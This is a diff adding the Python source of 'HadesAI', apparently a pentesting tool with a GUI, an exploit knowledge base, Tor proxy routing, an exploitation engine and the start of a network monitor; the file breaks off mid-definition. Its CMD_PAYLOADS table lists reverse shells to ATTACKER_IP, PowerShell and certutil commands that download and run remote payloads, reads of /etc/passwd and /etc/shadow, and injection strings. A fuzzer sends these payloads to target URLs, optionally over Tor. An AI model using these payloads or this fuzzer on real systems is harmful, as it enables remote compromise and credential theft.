@@ -1,0 +1,6111 @@
+"""
+HadesAI - Self-Learning Pentesting & Code Analysis AI
+With Interactive Chat, Web Learning, and Tool Execution
+
+💝 Support Development: https://buy.stripe.com/28EbJ1f7ceo3ckyeES5kk00
+"""
+
+import os
+import sys
+
+# Suppress Qt font warnings before importing PyQt
+os.environ['QT_LOGGING_RULES'] = '*.debug=false;qt.text.font.*=false'
+import json
+import hashlib
+import sqlite3
+import numpy as np
+from datetime import datetime
+from collections import defaultdict, Counter
+from typing import Dict, List, Any, Optional, Tuple
+from dataclasses import dataclass, field
+from pathlib import Path
+import re
+import threading
+import logging
+import time
+import csv
+import socket
+import urllib.parse
+import concurrent.futures
+import urllib3
+import ast
+import sys
+import traceback
+from io import StringIO
+import os
+import logging
+import importlib.util
+import pyfiglet
+from urllib.parse import urljoin
+from modules import personality_core_v2 as pcore
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# OpenAI GPT Integration
+try:
+    import openai
+    openai.api_key = os.getenv("OPENAI_API_KEY")
+    HAS_OPENAI = True
+except ImportError:
+    openai = None
+    HAS_OPENAI = False
+
+from PyQt6.QtWidgets import (
+    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
+    QPushButton, QTextEdit, QLabel, QProgressBar, QTabWidget,
+    QTreeWidget, QTreeWidgetItem, QComboBox, QLineEdit, QPlainTextEdit,
+    QGroupBox, QFormLayout, QSpinBox, QCheckBox,
+    QSplitter, QStatusBar, QMenuBar, QMenu, QFileDialog,
+    QMessageBox, QListWidget, QListWidgetItem, QTableWidget,
+    QTableWidgetItem, QHeaderView, QScrollArea
+)
+from PyQt6.QtCore import Qt, QThread, pyqtSignal, QTimer
+from PyQt6.QtGui import QFont, QColor, QTextCharFormat, QSyntaxHighlighter, QTextCursor
+
+try:
+    import requests
+    from requests.adapters import HTTPAdapter
+    from urllib3.util.retry import Retry
+    HAS_REQUESTS = True
+except ImportError:
+    HAS_REQUESTS = False
+
+try:
+    import socks
+    HAS_SOCKS = True
+except ImportError:
+    HAS_SOCKS = False
+
+try:
+    from reportlab.lib import colors
+    from reportlab.lib.pagesizes import letter, A4
+    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
+    from reportlab.lib.units import inch
+    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Preformatted, PageBreak
+    from reportlab.lib.enums import TA_LEFT, TA_CENTER
+    HAS_REPORTLAB = True
+except ImportError:
+    HAS_REPORTLAB = False
+
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logger = logging.getLogger("HadesAI")
+
+
+# ============================================================================
+# DATA CLASSES
+# ============================================================================
+
+@dataclass
+class Experience:
+    id: str
+    input_data: str
+    action_taken: str
+    result: str
+    reward: float
+    timestamp: datetime
+    category: str
+    metadata: Dict = field(default_factory=dict)
+
+
+@dataclass
+class SecurityPattern:
+    pattern_id: str
+    pattern_type: str
+    signature: str
+    confidence: float
+    occurrences: int
+    examples: List[str]
+    countermeasures: List[str]
+    cwe_ids: List[str]
+    cvss_score: Optional[float] = None
+
+
+@dataclass 
+class CacheEntry:
+    path: str
+    size: int
+    modified: float
+    file_hash: str
+    file_type: str
+    risk_level: str
+    browser: str
+    content_preview: str = ""
+    metadata: Dict = field(default_factory=dict)
+
+
+@dataclass
+class ThreatFinding:
+    path: str
+    threat_type: str
+    pattern: str
+    severity: str
+    code_snippet: str
+    browser: str
+    context: str = ""
+
+
+# ============================================================================
+# SYNTAX HIGHLIGHTER
+# ============================================================================
+
+class PythonHighlighter(QSyntaxHighlighter):
+    def __init__(self, parent=None):
+        super().__init__(parent)
+        self.highlighting_rules = []
+        
+        keyword_format = QTextCharFormat()
+        keyword_format.setForeground(QColor("#cc7832"))
+        keyword_format.setFontWeight(QFont.Weight.Bold)
+        keywords = ['and', 'as', 'assert', 'break', 'class', 'continue', 'def',
+            'del', 'elif', 'else', 'except', 'finally', 'for', 'from',
+            'global', 'if', 'import', 'in', 'is', 'lambda', 'not', 'or',
+            'pass', 'raise', 'return', 'try', 'while', 'with', 'yield']
+        for word in keywords:
+            self.highlighting_rules.append((re.compile(rf'\b{word}\b'), keyword_format))
+        
+        string_format = QTextCharFormat()
+        string_format.setForeground(QColor("#6a8759"))
+        self.highlighting_rules.append((re.compile(r'"[^"\\]*(\\.[^"\\]*)*"'), string_format))
+        self.highlighting_rules.append((re.compile(r"'[^'\\]*(\\.[^'\\]*)*'"), string_format))
+        
+        comment_format = QTextCharFormat()
+        comment_format.setForeground(QColor("#808080"))
+        self.highlighting_rules.append((re.compile(r'#.*'), comment_format))
+
+    def highlightBlock(self, text):
+        for pattern, fmt in self.highlighting_rules:
+            for match in pattern.finditer(text):
+                self.setFormat(match.start(), match.end() - match.start(), fmt)
+
+
+# ============================================================================
+# KNOWLEDGE BASE
+# ============================================================================
+# Banner
+print(pyfiglet.figlet_format("Hades AI"))
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger("HadesAI")
+logger.info("Hades AI Core initialized...")
+
+MODULE_DIR = "modules"
+loaded_modules = {}
+
+def parse_command(command):
+    parts = command.strip().split(maxsplit=1)
+    return parts if len(parts) == 2 else (parts[0], None)
+
+def load_module(module_name):
+    module_path = os.path.join(MODULE_DIR, f"{module_name}.py")
+    if not os.path.isfile(module_path):
+        return f"Module '{module_name}' not found."
+
+    spec = importlib.util.spec_from_file_location(module_name, module_path)
+    module = importlib.util.module_from_spec(spec)
+    try:
+        spec.loader.exec_module(module)
+        loaded_modules[module_name] = module
+        return f"Module '{module_name}' loaded."
+    except Exception as e:
+        return f"Failed to load module '{module_name}': {str(e)}"
+
+def list_modules():
+    if not os.path.exists(MODULE_DIR):
+        os.makedirs(MODULE_DIR)
+    files = [f[:-3] for f in os.listdir(MODULE_DIR) if f.endswith(".py")]
+    return files if files else ["No modules found."]
+
+def execute_module(module_name):
+    module = loaded_modules.get(module_name)
+    if not module:
+        return f"Module '{module_name}' not loaded."
+    if hasattr(module, "main"):
+        return module.main()
+    return f"Module '{module_name}' does not have a 'main()' function."
+
+def handle_command(action, target):
+    if action == "scan":
+        return f"Scanning {target}..."
+    elif action == "purge":
+        return f"Purging {target}..."
+    elif action == "initiate":
+        return f"Initiating {target}..."
+    elif action == "terminate":
+        return f"Terminating {target}..."
+    elif action == "echo":
+        return f"Hades echoes: {target}"
+    elif action == "help":
+        return "Commands: scan, purge, initiate, terminate, echo, help, load <module>, list modules, execute <module>"
+    elif action == "list" and target == "modules":
+        return "\n".join(list_modules())
+    elif action == "load":
+        return load_module(target)
+    elif action == "execute":
+        return execute_module(target)
+    else:
+        return "Hades does not comprehend your command."
+class KnowledgeBase:
+    def __init__(self, db_path: str = "hades_knowledge.db"):
+        self.db_path = db_path
+        self.conn = sqlite3.connect(db_path, check_same_thread=False)
+        self.lock = threading.Lock()
+        self._init_db()
+        
+    def _init_db(self):
+        cursor = self.conn.cursor()
+
+        cursor.execute('''CREATE TABLE IF NOT EXISTS security_patterns (
+            pattern_id TEXT PRIMARY KEY, pattern_type TEXT, signature TEXT,
+            confidence REAL, occurrences INTEGER, examples TEXT,
+            countermeasures TEXT, cwe_ids TEXT, cvss_score REAL)''')
+
+        cursor.execute('''CREATE TABLE IF NOT EXISTS threat_findings (
+            id INTEGER PRIMARY KEY AUTOINCREMENT, path TEXT, threat_type TEXT,
+            pattern TEXT, severity TEXT, code_snippet TEXT, browser TEXT,
+            context TEXT, detected_at TEXT)''')
+
+        cursor.execute('''CREATE TABLE IF NOT EXISTS learned_exploits (
+            id INTEGER PRIMARY KEY AUTOINCREMENT, source_url TEXT, exploit_type TEXT,
+            code TEXT, description TEXT, learned_at TEXT, success_count INTEGER,
+            fail_count INTEGER)''')
+
+        cursor.execute('''CREATE TABLE IF NOT EXISTS chat_history (
+            id INTEGER PRIMARY KEY AUTOINCREMENT, role TEXT, message TEXT,
+            timestamp TEXT, context TEXT)''')
+
+        cursor.execute('''CREATE TABLE IF NOT EXISTS web_learnings (
+            id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT, content_type TEXT,
+            patterns_found TEXT, exploits_found TEXT, learned_at TEXT)''')
+        
+        # NEW: Techniques table for normalized security knowledge
+        cursor.execute('''CREATE TABLE IF NOT EXISTS techniques (
+            technique_id TEXT PRIMARY KEY,
+            name TEXT NOT NULL,
+            category TEXT NOT NULL,
+            description TEXT,
+            indicators TEXT,
+            mitigations TEXT,
+            detection_rules TEXT,
+            references_json TEXT,
+            confidence REAL DEFAULT 0.5,
+            occurrences INTEGER DEFAULT 1,
+            updated_at TEXT)''')
+        
+        # NEW: Attack events for behavioral learning
+        cursor.execute('''CREATE TABLE IF NOT EXISTS attack_events (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            event_type TEXT NOT NULL,
+            src_ip TEXT,
+            dst_port INTEGER,
+            severity TEXT,
+            evidence TEXT,
+            action_taken TEXT,
+            technique_id TEXT,
+            created_at TEXT,
+            FOREIGN KEY (technique_id) REFERENCES techniques(technique_id))''')
+        
+        # NEW: CVE database for vulnerability knowledge
+        cursor.execute('''CREATE TABLE IF NOT EXISTS cves (
+            cve_id TEXT PRIMARY KEY,
+            summary TEXT,
+            cwe_ids TEXT,
+            cvss REAL,
+            affected_products TEXT,
+            references_json TEXT,
+            mitigations TEXT,
+            published TEXT,
+            last_modified TEXT)''')
+        
+        # NEW: IP reputation tracking
+        cursor.execute('''CREATE TABLE IF NOT EXISTS ip_reputation (
+            ip_address TEXT PRIMARY KEY,
+            threat_score REAL DEFAULT 0.0,
+            attack_count INTEGER DEFAULT 0,
+            first_seen TEXT,
+            last_seen TEXT,
+            categories TEXT,
+            is_blocked INTEGER DEFAULT 0,
+            notes TEXT)''')
+
+        self.conn.commit()
+    
+    # ========== Technique Management ==========
+    def store_technique(self, technique_id: str, name: str, category: str, 
+                        description: str = "", indicators: List[str] = None,
+                        mitigations: List[str] = None, detection_rules: List[str] = None,
+                        references: List[str] = None, confidence: float = 0.5):
+        with self.lock:
+            cursor = self.conn.cursor()
+            cursor.execute('''INSERT OR REPLACE INTO techniques
+                (technique_id, name, category, description, indicators, mitigations, 
+                 detection_rules, references_json, confidence, occurrences, updated_at)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 
+                    COALESCE((SELECT occurrences + 1 FROM techniques WHERE technique_id = ?), 1), ?)''',
+                (technique_id, name, category, description,
+                 json.dumps(indicators or []), json.dumps(mitigations or []),
+                 json.dumps(detection_rules or []), json.dumps(references or []),
+                 confidence, technique_id, datetime.now().isoformat()))
+            self.conn.commit()
+    
+    def search_techniques(self, query: str, limit: int = 5) -> List[Dict]:
+        """Search techniques by keyword"""
+        cursor = self.conn.cursor()
+        query_pattern = f"%{query.lower()}%"
+        cursor.execute('''SELECT * FROM techniques 
+            WHERE LOWER(name) LIKE ? OR LOWER(category) LIKE ? OR LOWER(description) LIKE ?
+            ORDER BY occurrences DESC, confidence DESC LIMIT ?''',
+            (query_pattern, query_pattern, query_pattern, limit))
+        return [self._row_to_technique(r) for r in cursor.fetchall()]
+    
+    def get_technique_by_category(self, category: str, limit: int = 10) -> List[Dict]:
+        cursor = self.conn.cursor()
+        cursor.execute('''SELECT * FROM techniques WHERE LOWER(category) = LOWER(?)
+            ORDER BY occurrences DESC LIMIT ?''', (category, limit))
+        return [self._row_to_technique(r) for r in cursor.fetchall()]
+    
+    def _row_to_technique(self, row) -> Dict:
+        return {
+            'technique_id': row[0], 'name': row[1], 'category': row[2],
+            'description': row[3], 'indicators': json.loads(row[4] or '[]'),
+            'mitigations': json.loads(row[5] or '[]'),
+            'detection_rules': json.loads(row[6] or '[]'),
+            'references': json.loads(row[7] or '[]'),
+            'confidence': row[8], 'occurrences': row[9], 'updated_at': row[10]
+        }
+    
+    # ========== Attack Event Logging ==========
+    def log_attack_event(self, event_type: str, src_ip: str, dst_port: int = 0,
+                         severity: str = "MEDIUM", evidence: Dict = None,
+                         action_taken: str = "", technique_id: str = None):
+        with self.lock:
+            cursor = self.conn.cursor()
+            cursor.execute('''INSERT INTO attack_events
+                (event_type, src_ip, dst_port, severity, evidence, action_taken, technique_id, created_at)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
+                (event_type, src_ip, dst_port, severity, json.dumps(evidence or {}),
+                 action_taken, technique_id, datetime.now().isoformat()))
+            self.conn.commit()
+            
+            # Update IP reputation
+            self._update_ip_reputation(src_ip, event_type, severity)
+    
+    def get_attack_events(self, limit: int = 100, src_ip: str = None) -> List[Dict]:
+        cursor = self.conn.cursor()
+        if src_ip:
+            cursor.execute('SELECT * FROM attack_events WHERE src_ip = ? ORDER BY created_at DESC LIMIT ?',
+                          (src_ip, limit))
+        else:
+            cursor.execute('SELECT * FROM attack_events ORDER BY created_at DESC LIMIT ?', (limit,))
+        return [{
+            'id': r[0], 'event_type': r[1], 'src_ip': r[2], 'dst_port': r[3],
+            'severity': r[4], 'evidence': json.loads(r[5] or '{}'),
+            'action_taken': r[6], 'technique_id': r[7], 'created_at': r[8]
+        } for r in cursor.fetchall()]
+    
+    # ========== IP Reputation ==========
+    def _update_ip_reputation(self, ip: str, event_type: str, severity: str):
+        severity_scores = {'LOW': 0.1, 'MEDIUM': 0.3, 'HIGH': 0.6, 'CRITICAL': 1.0}
+        score_delta = severity_scores.get(severity, 0.3)
+        
+        cursor = self.conn.cursor()
+        cursor.execute('SELECT threat_score, attack_count, categories FROM ip_reputation WHERE ip_address = ?', (ip,))
+        row = cursor.fetchone()
+        
+        now = datetime.now().isoformat()
+        if row:
+            new_score = min(10.0, row[0] + score_delta)
+            categories = json.loads(row[2] or '[]')
+            if event_type not in categories:
+                categories.append(event_type)
+            cursor.execute('''UPDATE ip_reputation 
+                SET threat_score = ?, attack_count = attack_count + 1, 
+                    last_seen = ?, categories = ?
+                WHERE ip_address = ?''',
+                (new_score, now, json.dumps(categories), ip))
+        else:
+            cursor.execute('''INSERT INTO ip_reputation 
+                (ip_address, threat_score, attack_count, first_seen, last_seen, categories)
+                VALUES (?, ?, 1, ?, ?, ?)''',
+                (ip, score_delta, now, now, json.dumps([event_type])))
+        self.conn.commit()
+    
+    def get_ip_reputation(self, ip: str) -> Optional[Dict]:
+        cursor = self.conn.cursor()
+        cursor.execute('SELECT * FROM ip_reputation WHERE ip_address = ?', (ip,))
+        row = cursor.fetchone()
+        if row:
+            return {
+                'ip': row[0], 'threat_score': row[1], 'attack_count': row[2],
+                'first_seen': row[3], 'last_seen': row[4],
+                'categories': json.loads(row[5] or '[]'),
+                'is_blocked': bool(row[6]), 'notes': row[7]
+            }
+        return None
+    
+    def get_malicious_ips(self, min_score: float = 3.0) -> List[str]:
+        cursor = self.conn.cursor()
+        cursor.execute('SELECT ip_address FROM ip_reputation WHERE threat_score >= ?', (min_score,))
+        return [r[0] for r in cursor.fetchall()]
+    
+    def block_ip(self, ip: str, reason: str = ""):
+        with self.lock:
+            cursor = self.conn.cursor()
+            cursor.execute('''INSERT OR REPLACE INTO ip_reputation 
+                (ip_address, threat_score, attack_count, first_seen, last_seen, is_blocked, notes)
+                VALUES (?, 10.0, COALESCE((SELECT attack_count FROM ip_reputation WHERE ip_address = ?), 1),
+                    COALESCE((SELECT first_seen FROM ip_reputation WHERE ip_address = ?), ?), ?, 1, ?)''',
+                (ip, ip, ip, datetime.now().isoformat(), datetime.now().isoformat(), reason))
+            self.conn.commit()
+    
+    # ========== CVE Management ==========
+    def store_cve(self, cve_id: str, summary: str, cwe_ids: List[str] = None,
+                  cvss: float = 0.0, affected: List[str] = None,
+                  references: List[str] = None, mitigations: List[str] = None):
+        with self.lock:
+            cursor = self.conn.cursor()
+            cursor.execute('''INSERT OR REPLACE INTO cves
+                (cve_id, summary, cwe_ids, cvss, affected_products, references_json, mitigations, 
+                 published, last_modified)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)''',
+                (cve_id, summary, json.dumps(cwe_ids or []), cvss,
+                 json.dumps(affected or []), json.dumps(references or []),
+                 json.dumps(mitigations or []), datetime.now().isoformat(), datetime.now().isoformat()))
+            self.conn.commit()
+    
+    def search_cves(self, query: str, limit: int = 10) -> List[Dict]:
+        cursor = self.conn.cursor()
+        if query.upper().startswith('CVE-'):
+            cursor.execute('SELECT * FROM cves WHERE cve_id = ?', (query.upper(),))
+        else:
+            cursor.execute('''SELECT * FROM cves WHERE LOWER(summary) LIKE ? 
+                OR LOWER(affected_products) LIKE ? ORDER BY cvss DESC LIMIT ?''',
+                (f'%{query.lower()}%', f'%{query.lower()}%', limit))
+        return [{
+            'cve_id': r[0], 'summary': r[1], 'cwe_ids': json.loads(r[2] or '[]'),
+            'cvss': r[3], 'affected': json.loads(r[4] or '[]'),
+            'references': json.loads(r[5] or '[]'), 'mitigations': json.loads(r[6] or '[]'),
+            'published': r[7], 'last_modified': r[8]
+        } for r in cursor.fetchall()]
+    
+    # ========== Intelligent Query ==========
+    def query_knowledge(self, query: str, context: str = "") -> Dict[str, Any]:
+        """Query all knowledge sources for relevant information"""
+        results = {
+            'techniques': self.search_techniques(query, 3),
+            'patterns': [],
+            'cves': self.search_cves(query, 3),
+            'exploits': [],
+            'ip_info': None
+        }
+        
+        # Check for IP address in query
+        ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', query)
+        if ip_match:
+            results['ip_info'] = self.get_ip_reputation(ip_match.group())
+        
+        # Search patterns
+        cursor = self.conn.cursor()
+        cursor.execute('''SELECT * FROM security_patterns 
+            WHERE LOWER(pattern_type) LIKE ? OR LOWER(signature) LIKE ?
+            ORDER BY occurrences DESC LIMIT 3''',
+            (f'%{query.lower()}%', f'%{query.lower()}%'))
+        results['patterns'] = self.get_patterns()[:3]
+        
+        # Search exploits
+        cursor.execute('''SELECT * FROM learned_exploits
+            WHERE LOWER(exploit_type) LIKE ? OR LOWER(description) LIKE ?
+            ORDER BY success_count DESC LIMIT 3''',
+            (f'%{query.lower()}%', f'%{query.lower()}%'))
+        results['exploits'] = [{
+            'type': r[2], 'source': r[1], 'description': r[4]
+        } for r in cursor.fetchall()]
+        
+        return results
+    def get_patterns(self) -> List[dict]:
+        cursor = self.conn.cursor()
+        cursor.execute('SELECT * FROM security_patterns')
+        return [
+        {
+        'pattern_id': r[0], 'pattern_type': r[1], 'signature': r[2],
+        'confidence': r[3], 'occurrences': r[4], 'examples': json.loads(r[5]),
+        'countermeasures': json.loads(r[6]), 'cwe_ids': json.loads(r[7]), 'cvss_score': r[8]
+        }
+        for r in cursor.fetchall()
+        ]
+
+
+    def store_threat_finding(self, finding):
+        with self.lock:
+            cursor = self.conn.cursor()
+            cursor.execute('''INSERT INTO threat_findings
+            (path, threat_type, pattern, severity, code_snippet, browser, context, detected_at)
+            VALUES (?,?,?,?,?,?,?,?)''',
+            (finding.path, finding.threat_type, finding.pattern, finding.severity,
+            finding.code_snippet, finding.browser, finding.context, datetime.now().isoformat()))
+            self.conn.commit()
+
+
+    def get_threat_findings(self, limit: int = 100) -> List[Dict]:
+        cursor = self.conn.cursor()
+        cursor.execute('SELECT * FROM threat_findings ORDER BY detected_at DESC LIMIT ?', (limit,))
+        return [
+        {
+        'id': r[0], 'path': r[1], 'threat_type': r[2], 'pattern': r[3],
+        'severity': r[4], 'code_snippet': r[5], 'browser': r[6],
+        'context': r[7], 'detected_at': r[8]
+        }
+        for r in cursor.fetchall()
+        ]
+
+
+    def store_learned_exploit(self, source_url: str, exploit_type: str, code: str, description: str):
+        with self.lock:
+            cursor = self.conn.cursor()
+            cursor.execute('''INSERT INTO learned_exploits
+            (source_url, exploit_type, code, description, learned_at, success_count, fail_count)
+            VALUES (?,?,?,?,?,0,0)''',
+            (source_url, exploit_type, code, description, datetime.now().isoformat()))
+            self.conn.commit()
+
+
+    def get_learned_exploits(self, limit: int = 50) -> List[Dict]:
+        cursor = self.conn.cursor()
+        cursor.execute('SELECT * FROM learned_exploits ORDER BY learned_at DESC LIMIT ?', (limit,))
+        return [
+        {
+        'id': r[0], 'source_url': r[1], 'exploit_type': r[2], 'code': r[3],
+        'description': r[4], 'learned_at': r[5], 'success_count': r[6], 'fail_count': r[7]
+        }
+        for r in cursor.fetchall()
+        ]
+
+
+    def store_chat(self, role: str, message: str, context: str = ""):
+        with self.lock:
+            cursor = self.conn.cursor()
+            cursor.execute('INSERT INTO chat_history (role, message, timestamp, context) VALUES (?,?,?,?)',
+            (role, message, datetime.now().isoformat(), context))
+            self.conn.commit()
+
+
+    def get_chat_history(self, limit: int = 50) -> List[Dict]:
+        cursor = self.conn.cursor()
+        cursor.execute('SELECT role, message, timestamp FROM chat_history ORDER BY id DESC LIMIT ?', (limit,))
+        return [
+        {'role': r[0], 'message': r[1], 'timestamp': r[2]} for r in reversed(cursor.fetchall())
+        ]
+
+
+    def store_web_learning(self, url: str, content_type: str, patterns: List, exploits: List):
+        with self.lock:
+            cursor = self.conn.cursor()
+            cursor.execute('''INSERT INTO web_learnings
+            (url, content_type, patterns_found, exploits_found, learned_at)
+            VALUES (?,?,?,?,?)''',
+            (url, content_type, json.dumps(patterns), json.dumps(exploits), datetime.now().isoformat()))
+            self.conn.commit()
+
+
+    def fetch_recent_web_patterns(self, limit=1) -> List[str]:
+        cursor = self.conn.cursor()
+        cursor.execute('SELECT patterns_found FROM web_learnings ORDER BY learned_at DESC LIMIT ?', (limit,))
+        return [json.loads(row[0]) for row in cursor.fetchall() if row[0]]
+
+
+# ============================================================================
+# WEB LEARNER - Learn from websites
+# ============================================================================
+
+# ============================================================================
+# PROXY MANAGER - Tor/SOCKS/HTTP Proxy Support
+# ============================================================================
+
+class ProxyManager:
+    TOR_DEFAULT = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
+    
+    def __init__(self):
+        self.enabled = False
+        self.proxy_type = 'none'  # none, tor, socks5, http
+        self.proxy_host = '127.0.0.1'
+        self.proxy_port = 9050
+        self.proxy_user = None
+        self.proxy_pass = None
+        self.rotate_enabled = False
+        self.proxy_list = []
+        self.current_proxy_idx = 0
+        
+    def get_proxies(self) -> Optional[Dict]:
+        if not self.enabled:
+            return None
+            
+        if self.proxy_type == 'tor':
+            return self.TOR_DEFAULT
+        elif self.proxy_type == 'socks5':
+            auth = f"{self.proxy_user}:{self.proxy_pass}@" if self.proxy_user else ""
+            proxy_url = f"socks5h://{auth}{self.proxy_host}:{self.proxy_port}"
+            return {'http': proxy_url, 'https': proxy_url}
+        elif self.proxy_type == 'http':
+            auth = f"{self.proxy_user}:{self.proxy_pass}@" if self.proxy_user else ""
+            proxy_url = f"http://{auth}{self.proxy_host}:{self.proxy_port}"
+            return {'http': proxy_url, 'https': proxy_url}
+        elif self.proxy_type == 'rotating' and self.proxy_list:
+            proxy = self.proxy_list[self.current_proxy_idx % len(self.proxy_list)]
+            self.current_proxy_idx += 1
+            return {'http': proxy, 'https': proxy}
+        return None
+    
+    def get_session(self) -> requests.Session:
+        session = requests.Session()
+        proxies = self.get_proxies()
+        if proxies:
+            session.proxies.update(proxies)
+        session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        })
+        retries = Retry(total=3, backoff_factor=0.5)
+        session.mount('http://', HTTPAdapter(max_retries=retries))
+        session.mount('https://', HTTPAdapter(max_retries=retries))
+        return session
+    
+    def test_connection(self) -> Dict:
+        try:
+            session = self.get_session()
+            r = session.get('https://api.ipify.org?format=json', timeout=10)
+            return {'success': True, 'ip': r.json().get('ip'), 'proxy': self.proxy_type}
+        except Exception as e:
+            return {'success': False, 'error': str(e)}
+
+
+# ============================================================================
+# ACTIVE EXPLOITATION MODULE
+# ============================================================================
+
+class ExploitationEngine:
+    CMD_PAYLOADS = {
+        'linux': {
+            'whoami': ['whoami', '$(whoami)', '`whoami`', ';whoami', '|whoami', '\nwhoami'],
+            'id': ['id', '$(id)', '`id`', ';id', '|id'],
+            'ls': ['ls', 'ls -la', '$(ls)', ';ls -la', '|ls'],
+            'pwd': ['pwd', '$(pwd)', ';pwd', '|pwd'],
+            'uname': ['uname -a', '$(uname -a)', ';uname -a'],
+            'cat_passwd': ['cat /etc/passwd', ';cat /etc/passwd', '|cat /etc/passwd'],
+            'cat_shadow': ['cat /etc/shadow', ';cat /etc/shadow'],
+            'ifconfig': ['ifconfig', 'ip addr', ';ifconfig', '|ip addr'],
+            'netstat': ['netstat -an', 'ss -tuln', ';netstat -an'],
+            'ps': ['ps aux', 'ps -ef', ';ps aux'],
+            'env': ['env', 'printenv', ';env', '$(env)'],
+            'curl': ['curl http://ATTACKER_IP', 'wget http://ATTACKER_IP'],
+            'reverse_shell': [
+                'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1',
+                'nc -e /bin/sh ATTACKER_IP PORT',
+                'python -c \'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
+            ]
+        },
+        'windows': {
+            'whoami': ['whoami', '& whoami', '| whoami', '\r\nwhoami'],
+            'dir': ['dir', '& dir', '| dir', 'dir /s'],
+            'ipconfig': ['ipconfig', 'ipconfig /all', '& ipconfig'],
+            'net_user': ['net user', '& net user', 'net localgroup administrators'],
+            'systeminfo': ['systeminfo', '& systeminfo'],
+            'tasklist': ['tasklist', '& tasklist'],
+            'netstat': ['netstat -an', '& netstat -an'],
+            'powershell': [
+                'powershell -c "whoami"',
+                'powershell -enc BASE64_PAYLOAD',
+                'powershell IEX(New-Object Net.WebClient).DownloadString(\'http://ATTACKER_IP/shell.ps1\')'
+            ],
+            'certutil': ['certutil -urlcache -split -f http://ATTACKER_IP/payload.exe'],
+        }
+    }
+    
+    INJECTION_CONTEXTS = {
+        'command': [';', '|', '`', '$(',  ')', '\n', '\r\n', '&&', '||'],
+        'sql': ["'", '"', '--', '/*', '*/', ';--', "' OR '1'='1", "1 OR 1=1"],
+        'xss': ['<script>', '</script>', 'javascript:', 'onerror=', 'onload='],
+        'ssti': ['{{', '}}', '${', '}', '<%', '%>', '{#', '#}'],
+        'xxe': ['<!DOCTYPE', '<!ENTITY', 'SYSTEM', 'file://'],
+    }
+    
+    def __init__(self, proxy_manager: ProxyManager = None):
+        self.proxy = proxy_manager or ProxyManager()
+        self.results = []
+        
+    def generate_payloads(self, payload_type: str, os_type: str = 'linux', 
+                          attacker_ip: str = '', attacker_port: str = '4444') -> List[Dict]:
+        payloads = []
+        
+        os_payloads = self.CMD_PAYLOADS.get(os_type, self.CMD_PAYLOADS['linux'])
+        if payload_type in os_payloads:
+            for payload in os_payloads[payload_type]:
+                p = payload.replace('ATTACKER_IP', attacker_ip).replace('PORT', attacker_port)
+                payloads.append({
+                    'payload': p,
+                    'type': payload_type,
+                    'os': os_type,
+                    'context': 'command'
+                })
+        
+        return payloads
+    
+    def fuzz_parameter(self, url: str, param: str, payloads: List[str], 
+                       method: str = 'GET') -> List[Dict]:
+        if not HAS_REQUESTS:
+            return [{'error': 'requests not installed'}]
+            
+        results = []
+        session = self.proxy.get_session()
+        
+        for payload in payloads:
+            try:
+                if method.upper() == 'GET':
+                    test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
+                    r = session.get(test_url, timeout=10, verify=False)
+                else:
+                    r = session.post(url, data={param: payload}, timeout=10, verify=False)
+                
+                indicators = self._check_exploitation_indicators(r.text, payload)
+                
+                results.append({
+                    'payload': payload,
+                    'status': r.status_code,
+                    'length': len(r.content),
+                    'indicators': indicators,
+                    'vulnerable': len(indicators) > 0
+                })
+                
+            except Exception as e:
+                results.append({'payload': payload, 'error': str(e)})
+                
+        return results
+    
+    def _check_exploitation_indicators(self, response: str, payload: str) -> List[str]:
+        indicators = []
+        response_lower = response.lower()
+        
+        success_patterns = [
+            ('uid=', 'Linux user ID found'),
+            ('gid=', 'Linux group ID found'),
+            ('root:', 'Passwd file content'),
+            ('www-data', 'Web user found'),
+            ('WINDOWS', 'Windows system'),
+            ('Administrator', 'Admin user found'),
+            ('Directory of', 'Windows dir listing'),
+            ('total ', 'Linux dir listing'),
+            ('inet ', 'Network interface'),
+            ('eth0', 'Network interface'),
+            ('127.0.0.1', 'Localhost reference'),
+        ]
+        
+        for pattern, desc in success_patterns:
+            if pattern.lower() in response_lower:
+                indicators.append(desc)
+                
+        return indicators
+
+
+# ============================================================================
+# NETWORK MONITOR - Active Defense System
+# ============================================================================
+
+class NetworkMonitor(QThread):
+    """Real-time network connection monitor with threat detection and active defense"""
+    connection_detected = pyqtSignal(dict)
+    threat_detected = pyqtSignal(dict)
+    status_update = pyqtSignal(str)
+    stats_update = pyqtSignal(dict)
+    auto_response = pyqtSignal(dict)  # NEW: Signal for automatic responses
+    
+    THREAT_PORTS = {
+        21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
+        135: 'RPC', 139: 'NetBIOS', 445: 'SMB', 1433: 'MSSQL', 1434: 'MSSQL-UDP',
+        3306: 'MySQL', 3389: 'RDP', 4444: 'Metasploit', 5432: 'PostgreSQL',
+        5900: 'VNC', 6379: 'Redis', 8080: 'HTTP-Alt', 27017: 'MongoDB',
+        31337: 'BackOrifice', 12345: 'NetBus', 54321: 'BackOrifice2K',
+    }
+    
+    # Attack detection thresholds
+    SCAN_THRESHOLD_PORTS = 15  # Unique ports in time window = port scan
+    SCAN_THRESHOLD_TIME = 30  # Time window in seconds
+    BRUTE_FORCE_THRESHOLD = 10  # Connections to auth ports in time window
+    BRUTE_FORCE_TIME = 60  # Time window in seconds
+    
+    # Attack technique mappings
+    ATTACK_TECHNIQUES = {
